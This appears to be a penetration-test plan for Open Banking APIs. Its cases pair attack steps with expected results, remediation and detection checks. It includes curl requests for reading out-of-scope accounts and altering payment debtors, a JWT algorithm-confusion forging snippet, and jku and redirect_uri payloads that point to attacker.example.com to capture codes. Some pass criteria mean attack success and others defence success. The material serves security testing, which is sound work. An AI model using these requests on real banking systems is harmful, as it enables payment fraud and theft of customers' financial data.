# Open Banking Attack — Test Cases

> Structured test case templates for validating Open Banking attack coverage. **Objective**: validate attacker coverage of all Open Banking profiles (FAPI 1.0, FAPI 2.0, PSD2, OBIE, Brazil OF, India AA, US FDX, SG APIX, AU CDR) with reproducible evidence per test case.

## Conventions

- **Severity**: CRITICAL / HIGH / MEDIUM / LOW
- **Prerequisites**: Required access, accounts, certs
- **Objective**: Per-case attack goal
- **Reference**: Pointer to `payloads.md` section

---

## A. Discovery

### TC-OB-001 — OIDC Configuration Discovery

**Severity**: LOW
**Prerequisites**: Public access to ASPSP

**Test Steps**:
1. `curl -s https://auth.example.com/.well-known/openid-configuration | jq .`
2. Identify FAPI version (PAR, mTLS, DPoP support)
3. Identify scopes supported
4. Identify JARM support

**Expected Results**:
- FAPI 2.0: PAR + mTLS + JARM + PS256 only
- FAPI 1.0 Baseline: PAR + PKCE
- Vulnerable: no PAR, no mTLS, `none` alg allowed

**Remediation**:
- Enforce FAPI 2.0 Security Profile

**Pass Criteria**: Documented FAPI profile

**Reference**: payloads.md §1.1

---

### TC-OB-002 — JWKS Enumeration

**Severity**: LOW
**Prerequisites**: Public access to JWKS endpoint

**Test Steps**:
1. `curl -s https://auth.example.com/jwks | jq '.keys[].kid'`
2. Identify key algorithms
3. Look for expired / weak keys

**Expected Results**:
- All keys PS256/ES256
- Rotated quarterly
- Old keys removed after grace period

**Remediation**:
- Rotate keys annually
- Remove expired keys

**Pass Criteria**: Key inventory complete

**Reference**: payloads.md §1.3

---

### TC-OB-003 — TPP Registry Recon

**Severity**: LOW
**Prerequisites**: Public registry access

**Test Steps**:
1. Query FCA registry for client TPPs
2. Document competitors' onboarding patterns
3. Identify sandbox-vs-prod TPP patterns

**Expected Results**:
- Registry access allows enumeration

**Remediation**:
- Rate-limit registry queries
- Audit suspicious query patterns

**Pass Criteria**: Listed ≥10 TPPs with permissions

**Reference**: payloads.md §1.4

---

## B. TPP Onboarding

### TC-OB-004 — Sandbox-to-Prod Escalation

**Severity**: HIGH
**Prerequisites**: Sandbox TPP account

**Test Steps**:
1. Register sandbox TPP with sandbox certs
2. Try to call production endpoints with sandbox certs
3. Try to use sandbox tokens on production

**Expected Results**:
- Hardened: certs scoped to environment
- Vulnerable: sandbox cert accepted in prod

**Remediation**:
- Cert scope per environment
- eIDAS cert vs sandbox cert distinction
- API key per environment

**Pass Criteria**: Sandbox cert rejected in prod

**Reference**: payloads.md §2

---

### TC-OB-005 — eIDAS Cert Replay

**Severity**: CRITICAL
**Prerequisites**: Captured eIDAS cert

**Test Steps**:
1. Capture eIDAS QWAC/QSeal cert from compromised TPP
2. Register new TPP with stolen cert
3. Initiate customer flows

**Expected Results**:
- Hardened: eIDAS cert bound to TPP identity (signature chain)
- Vulnerable: stolen cert accepted

**Remediation**:
- eIDAS cert revocation list checks
- Pin cert to TPP FRN
- Audit cert usage

**Pass Criteria**: Stolen cert accepted as new TPP

**Reference**: payloads.md §2

---

## C. AIS Abuse

### TC-OB-006 — AIS IdOR

**Severity**: CRITICAL
**Prerequisites**: Valid AIS consent

**Test Steps**:
1. Get AIS consent for account A
2. Try to read account B (not in consent):
   ```bash
   curl -sk "https://api.example.com/open-banking/v3.1/aisp/accounts/$ACCOUNT_B/transactions" \
     -H "Authorization: Bearer $TOKEN" \
     --cert qwac.crt --key qwac.key
   ```
3. Try sequential IDs

**Expected Results**:
- Hardened: 403 Forbidden for account B
- Vulnerable: 200 OK with account B transactions

**Remediation**:
- Enforce consent scope on every read
- Account ID cross-checked against consent
- Rate-limit account ID brute force

**Pass Criteria**: Read account B with account A's consent

**Reference**: payloads.md §6.1

---

### TC-OB-007 — AIS Permission Scope Escalation

**Severity**: HIGH
**Prerequisites**: AIS consent with limited permissions

**Test Steps**:
1. Get consent with permissions: `["ReadAccountsDetail", "ReadBalances"]`
2. Try to read beneficiaries:
   ```bash
   curl -sk "https://api.example.com/open-banking/v3.1/aisp/accounts/$ID/beneficiaries" \
     -H "Authorization: Bearer $TOKEN" --cert qwac.crt --key qwac.key
   ```
3. Try direct debits, standing orders

**Expected Results**:
- Hardened: 403 for out-of-scope permissions
- Vulnerable: 200 OK

**Remediation**:
- Per-permission enforcement on each endpoint
- Audit permission scope use

**Pass Criteria**: Read beneficiaries without permission

**Reference**: payloads.md §6.3

---

### TC-OB-008 — AIS Read Beyond Date Scope

**Severity**: MEDIUM
**Prerequisites**: AIS consent with date range

**Test Steps**:
1. Get consent with `TransactionFromDateTime: 2025-01-01`
2. Try to read older transactions:
   ```bash
   curl -sk "https://api.example.com/open-banking/v3.1/aisp/accounts/$ID/transactions?fromBookingDateTime=2020-01-01" \
     -H "Authorization: Bearer $TOKEN"
   ```

**Expected Results**:
- Hardened: 403 or empty response for out-of-scope dates
- Vulnerable: full historical data

**Remediation**:
- Enforce date range on read

**Pass Criteria**: Read pre-consent-date transactions

**Reference**: payloads.md §6.2

---

## D. PIS Abuse

### TC-OB-009 — Debtor Account Manipulation

**Severity**: CRITICAL
**Prerequisites**: PIS consent

**Test Steps**:
1. Get PIS consent with debtor A
2. Submit payment with debtor B:
   ```bash
   curl -X POST https://api.example.com/open-banking/v3.1/pisp/domestic-payments \
     -H "Authorization: Bearer $TOKEN" \
     --cert qwac.crt --key qwac.key \
     -d '{"Data":{"ConsentId":"...", "Initiation":{..., "DebtorAccount":{"Identification":"B"}}}}'
   ```

**Expected Results**:
- Hardened: payment rejected; debtor must match consent
- Vulnerable: payment initiated from wrong account

**Remediation**:
- Debtor account immutable from consent
- Cross-check debtor in submission against consent

**Pass Criteria**: Payment from wrong debtor account

**Reference**: payloads.md §7.1

---

### TC-OB-010 — Creditor Account Manipulation

**Severity**: CRITICAL
**Prerequisites**: PIS consent with creditor A

**Test Steps**:
1. Get PIS consent with creditor A
2. Submit payment with creditor B (attacker-controlled)
3. Verify funds went to B

**Expected Results**:
- Hardened: payment rejected
- Vulnerable: funds diverted

**Remediation**:
- Creditor account immutable
- Cross-check creditor in submission

**Pass Criteria**: Funds sent to wrong creditor

**Reference**: payloads.md §7.4

---

### TC-OB-011 — Amount Escalation After Consent

**Severity**: CRITICAL
**Prerequisites**: PIS consent for small amount

**Test Steps**:
1. Get PIS consent for 0.01 GBP
2. Submit payment for 1000 GBP using same consent

**Expected Results**:
- Hardened: amount locked at consent value
- Vulnerable: large payment initiated

**Remediation**:
- Amount immutable from consent
- Cross-check amount in submission

**Pass Criteria**: Large payment from small-amount consent

**Reference**: payloads.md §7.2

---

### TC-OB-012 — Multiple Payments Per Consent

**Severity**: HIGH
**Prerequisites**: PIS consent

**Test Steps**:
1. Get PIS consent (single-payment)
2. Submit payment multiple times with same consent

**Expected Results**:
- Hardened: consent one-time use; subsequent rejected
- Vulnerable: multiple payments initiated

**Remediation**:
- One-payment-per-consent enforcement
- Status check before payment submission

**Pass Criteria**: Multiple payments from single consent

**Reference**: payloads.md §7.3

---

## E. Token Abuse

### TC-OB-013 — mTLS Sender-Constrained Token Bypass

**Severity**: CRITICAL
**Prerequisites**: Token issued with mTLS cert A

**Test Steps**:
1. Get access token with cert A
2. Try to use token without any cert:
   ```bash
   curl -sk https://api.example.com/open-banking/v3.1/aisp/accounts \
     -H "Authorization: Bearer $TOKEN"
   ```
3. Try with cert B (different from token):

**Expected Results**:
- Hardened: both attempts fail
- Vulnerable: at least one succeeds

**Remediation**:
- Enforce mTLS on every endpoint
- Bind token to cert thumbprint

**Pass Criteria**: Token works without matching cert

**Reference**: payloads.md §8.1

---

### TC-OB-014 — DPoP Bypass

**Severity**: CRITICAL
**Prerequisites**: Token issued with DPoP proof

**Test Steps**:
1. Get access token with DPoP proof A
2. Try to use token without DPoP header
3. Try with tampered proof

**Expected Results**:
- Hardened: both fail
- Vulnerable: token works without DPoP

**Remediation**:
- Enforce DPoP on every endpoint
- Validate DPoP nonce + htm + htu

**Pass Criteria**: Token works without valid DPoP

**Reference**: payloads.md §8.2

---

### TC-OB-015 — JWT Algorithm Confusion

**Severity**: CRITICAL
**Prerequisites**: ASPSP JWT validation logic

**Test Steps**:
1. Get bank's public key (RSA)
2. Forge JWT with HS256 using bank's public key as HMAC secret:
   ```bash
   python3 -c "
   import jwt
   key = open('bank-pub.pem', 'rb').read()
   token = jwt.encode({'sub': 'admin'}, key, algorithm='HS256')
   print(token)
   "
   ```
3. Submit forged token:
   ```bash
   curl -H "Authorization: Bearer $FORGED" ...
   ```

**Expected Results**:
- Hardened: only PS256/ES256 accepted
- Vulnerable: HS256 with RSA key works

**Remediation**:
- Allowlist: only `alg: PS256, ES256`
- Reject `HS256` for RSA-issued tokens

**Pass Criteria**: Forged token accepted

**Reference**: payloads.md §8.4

---

### TC-OB-016 — JWT jku Header Injection

**Severity**: CRITICAL
**Prerequisites**: JWT library fetches jku

**Test Steps**:
1. Generate attacker RSA keypair
2. Serve attacker JWKS at `https://attacker.example.com/jwks.json`
3. Sign JWT with attacker key, header `jku: https://attacker.example.com/jwks.json`
4. Submit JWT

**Expected Results**:
- Hardened: jku must match known ASPSP list
- Vulnerable: bank fetches attacker JWKS

**Remediation**:
- jku allowlist
- Pin kid to local JWKS only

**Pass Criteria**: Forged JWT verified via attacker jku

**Reference**: payloads.md §8.5

---

### TC-OB-017 — Refresh Token Infinite Loop

**Severity**: HIGH
**Prerequisites**: Refresh token from valid consent

**Test Steps**:
1. Get access token + refresh token
2. Loop refresh forever (no customer re-approval):
   ```bash
   while true; do
     RESPONSE=$(curl -X POST https://auth.example.com/token \
       -d "grant_type=refresh_token&refresh_token=$REFRESH")
     REFRESH=$(echo $RESPONSE | jq -r .refresh_token)
     sleep 3600
   done
   ```

**Expected Results**:
- Hardened: refresh token rotation limited (e.g., 90 days)
- Vulnerable: infinite refresh

**Remediation**:
- Refresh token TTL
- Customer re-approval required periodically
- Detect refresh loop patterns

**Pass Criteria**: Refresh loop runs >7 days

**Reference**: payloads.md §8.3

---

## F. SCA Bypass

### TC-OB-018 — Redirect URI Manipulation

**Severity**: HIGH
**Prerequisites**: TPP client_id with redirect allowlist

**Test Steps**:
1. Identify allowlist pattern
2. Try wildcard bypass:
   ```bash
   curl -G "https://auth.example.com/authorize" \
     --data-urlencode "redirect_uri=https://tpp.example.com.evil.com/cb"
   ```
3. Try open redirector chain:
   ```bash
   curl -G "https://auth.example.com/authorize" \
     --data-urlencode "redirect_uri=https://tpp.example.com/cb?next=https://attacker.example.com/steal"
   ```

**Expected Results**:
- Hardened: exact match required
- Vulnerable: any of above works

**Remediation**:
- Exact redirect URI match
- No wildcard allowlist
- No query string in registered URIs

**Pass Criteria**: Captured auth code via manipulated redirect

**Reference**: payloads.md §5.1

---

### TC-OB-019 — SCA Exemption Abuse

**Severity**: HIGH
**Prerequisites**: Knowledge of SCA exemption rules

**Test Steps**:
1. Identify SCA exemption thresholds (e.g., ≤ €30 trusted beneficiary)
2. Initiate payment just below threshold
3. Verify SCA skipped

**Expected Results**:
- Hardened: SCA required for first-time payee
- Vulnerable: SCA skipped below threshold

**Remediation**:
- SCA required for new payees regardless of amount
- Exemption only for known beneficiaries

**Pass Criteria**: Payment below threshold without SCA

**Reference**: payloads.md §5.2

---

### TC-OB-020 — CIBA auth_req_id Replay

**Severity**: HIGH
**Prerequisites**: CIBA flow

**Test Steps**:
1. Initiate CIBA: get auth_req_id
2. Poll token endpoint with same auth_req_id multiple times:
   ```bash
   for i in 1 2 3; do
     curl -X POST https://auth.example.com/token \
       -d "grant_type=urn:openid:params:grant-type:ciba&auth_req_id=$ID"
   done
   ```

**Expected Results**:
- Hardened: auth_req_id one-time use
- Vulnerable: multiple tokens from one ID

**Remediation**:
- auth_req_id one-time use
- Short TTL (5 min)

**Pass Criteria**: Multiple tokens from one auth_req_id

**Reference**: payloads.md §12.2

---

## G. Consent Manipulation

### TC-OB-021 — Consent Re-use Across TPPs

**Severity**: CRITICAL
**Prerequisites**: Multiple TPP clients

**Test Steps**:
1. TPP-A creates consent
2. Try to use consent from TPP-B (different cert):
   ```bash
   curl -sk https://api.example.com/open-banking/v3.1/aisp/accounts/$ID/transactions \
     -H "Authorization: Bearer $TOKEN_B" \
     --cert tpp_b_qwac.crt --key tpp_b_qwac.key
   ```

**Expected Results**:
- Hardened: consent tied to TPP client_id
- Vulnerable: cross-TPP consent use

**Remediation**:
- Consent ID bound to client_id
- Cross-check at every read

**Pass Criteria**: TPP-B used TPP-A's consent

**Reference**: payloads.md §9.1

---

### TC-OB-022 — Long-Lived Consent (RTS Violation)

**Severity**: MEDIUM
**Prerequisites**: AIS consent creation

**Test Steps**:
1. Try to create consent with `ExpirationDateTime: 2099-12-31`:
   ```bash
   curl -X POST .../account-access-consents \
     -d '{"Data":{..., "ExpirationDateTime":"2099-12-31T00:00:00Z", "RecurringIndicator":true}}'
   ```

**Expected Results**:
- Hardened: RTS limit enforced (12 months max)
- Vulnerable: long consent created

**Remediation**:
- Enforce RTS limit
- Validate ExpirationDateTime against now + 365 days

**Pass Criteria**: Created consent > 12 months

**Reference**: payloads.md §9.3

---

## H. App-to-App (A2A)

### TC-OB-023 — A2A Redirect Interception

**Severity**: HIGH
**Prerequisites**: Customer device MITM

**Test Steps**:
1. MITM customer device with mitmproxy
2. Capture a2a redirect: `GET https://tpp.example.com/return?code=...`
3. Replay code via different TPP / IP

**Expected Results**:
- Hardened: code bound to client + IP + DPoP/mTLS
- Vulnerable: code replayed

**Remediation**:
- Code bound to client_id, IP, device
- One-time use with short TTL (5 min)
- PKCE mandatory

**Pass Criteria**: Captured code replayed successfully

**Reference**: payloads.md §11.2

---

## I. CBPII Funds Confirmation

### TC-OB-024 — Balance Brute-Force via Funds Confirmation

**Severity**: MEDIUM
**Prerequisites**: CBPII consent

**Test Steps**:
1. Create CBPII consent
2. Binary search funds confirmation amounts:
   ```bash
   for amt in 100 500 1000 5000 10000 50000; do
     curl -X POST .../funds-confirmations \
       -d "{..., \"InstructedAmount\":{\"Amount\":\"$amt.00\",\"Currency\":\"GBP\"}}" | jq .Data.FundsAvailable
   done
   ```

**Expected Results**:
- Hardened: rate-limit on funds confirmation attempts
- Vulnerable: balance discovered

**Remediation**:
- Rate-limit (≤ 5 per minute)
- Account lockout after N attempts

**Pass Criteria**: Discovered customer balance via brute force

**Reference**: payloads.md §13.2

---

## J. Detection Validation

### TC-OB-025 — Detect AIS Read Beyond Scope

**Severity**: LOW
**Prerequisites**: Detection tooling deployed

**Test Steps**:
1. Create consent for account A
2. Attempt to read account B
3. Verify detection alert fires

**Expected Results**:
- Sigma rule fires on out-of-scope read

**Remediation**:
- Tune detection rules

**Pass Criteria**: Detection alert within 60s

**Reference**: payloads.md §14

---

### TC-OB-026 — Detect Refresh Token Loop

**Severity**: LOW
**Prerequisites**: Detection tooling deployed

**Test Steps**:
1. Refresh token 10+ times in 24h
2. Verify detection alerts

**Expected Results**:
- Refresh loop detected

**Remediation**:
- Alert on >5 refresh per day

**Pass Criteria**: Detection alert within 24h

**Reference**: payloads.md §14

---

## K. Multi-Region Variants

### TC-OB-027 — Brazil Open Finance Specific

**Severity**: MEDIUM
**Prerequisites**: Brazil OF access

**Test Steps**:
1. Discover OF Brazil endpoints: `curl https://auth.example.com.br/.well-known/openid-configuration`
2. Identify Brazil-specific flows (e.g., dynamic client registration)
3. Test Brazil-specific SCA exemptions

**Expected Results**:
- Brazil OF profiles identified

**Remediation**:
- Apply BACEN OF Brazil guidelines

**Pass Criteria**: Documented Brazil-specific profile

**Reference**: payloads.md §1

---

### TC-OB-028 — India Account Aggregator Specific

**Severity**: MEDIUM
**Prerequisites**: India AA access

**Test Steps**:
1. Discover AA endpoints
2. Identify FIU (Financial Information User) onboarding
3. Test India-specific consent flow (Consent artefact)

**Expected Results**:
- AA-specific flows mapped

**Remediation**:
- Apply Sahamati / RBI guidelines

**Pass Criteria**: AA consent artefact obtained

**Reference**: payloads.md §1

---

## Aggregate Pass Criteria

A successful engagement covers at minimum:
- **≥6 test cases passed across ≥3 Open Banking flow types** (AIS, PIS, CBPII, CIBA)
- **≥1 CRITICAL case demonstrating full breach chain**
- **≥1 token abuse finding** (mTLS bypass, JWT alg confusion, refresh loop)
- **≥1 consent manipulation finding**
- **≥1 SCA bypass finding** (redirect, exemption, decoupled)
- **≥1 detection rule** for at least one demonstrated attack
- **≥1 multi-region variant** tested (UK, EU, Brazil, India)

---

## Reporting Template

```markdown
### TC-OB-XXX — <Case Title>

**Status**: PASS / FAIL / PARTIAL
**Target**: <ASPSP / TPP>
**Window**: <start> - <end> UTC
**Operator**: <name>

**Findings**:
- <bullet points>

**Evidence**:
- API responses: <path>
- JWT tokens: <path>
- mitmproxy capture: <path>

**Impact**:
- <financial data exposure / unauthorized payment>
- <affected customers estimate>

**Remediation**:
1. <short-term>
2. <medium-term>
3. <long-term>

**Detection Rule**:
<sigma / falco>

**References**:
- FAPI spec: <URL>
- Bank advisory: <URL>
```

---

## References

- OpenID FAPI 2.0 — https://openid.net/specs/fapi-2_0.html
- FAPI 1.0 Advanced — https://openid.net/specs/openid-financial-api-part-2-1_0.html
- OAuth 2.0 PAR (RFC 9126)
- OAuth 2.0 DPoP (RFC 9449)
- OAuth 2.0 mTLS (RFC 8705)
- UK Open Banking — https://standards.openbanking.org.uk/
- PSD2 — https://eur-lex.europa.eu/eli/dir/2015/2366/oj
- EBA RTS SCA
- Brazil Open Finance — https://openfinancebrasil.org.br/
- US FDX — https://financialdataexchange.org/
- India AA — https://sahamati.org.in/
- OWASP FAPI Cheat Sheet
- "Open Banking Security" (Canhoto, 2024)
